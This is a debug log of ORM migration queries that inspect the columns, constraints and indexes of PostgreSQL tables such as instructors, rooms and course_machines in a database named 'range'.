2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.809ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.155ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.882ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.161ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'account_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.062ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.882ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND constraint_name = 'fk_instructors_user'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.696ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructors_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.118ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructor_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.695ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.339ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.440ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'rooms'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.259ms] [34;1m[rows:-][0m SELECT * FROM "rooms" LIMIT 5

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.320ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'rooms' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[15.248ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'rooms'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.885ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'rooms'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.242ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.436ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.337ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.626ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.800ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'title') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.144ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'description') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.209ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'room_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.146ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.368ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'instructor_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.837ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND constraint_name = 'fk_rooms_instructor'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.825ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'rooms' AND indexname = 'idx_rooms_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.654ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.416ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.212ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.648ms] [34;1m[rows:-][0m SELECT * FROM "difficulty_levels" LIMIT 5

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.087ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'difficulty_levels' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.228ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'difficulty_levels'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.525ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'difficulty_levels'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.189ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.036ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.089ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.101ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.090ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'level') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.833ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'difficulty_levels' AND indexname = 'idx_difficulty_levels_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.618ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.708ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.055ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.004ms] [34;1m[rows:-][0m SELECT * FROM "course_machines" LIMIT 5

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.793ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'course_machines' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.439ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'course_machines'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.535ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'course_machines'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.037ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.752ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.106ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.060ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.099ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'title') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.067ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'description') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.048ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'point') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.087ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'difficulty_level_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.070ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND constraint_name = 'fk_course_machines_difficulty_level'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.959ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'course_machines' AND indexname = 'idx_course_machines_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.773ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND table_type = 'BASE TABLE'

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.383ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:45 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
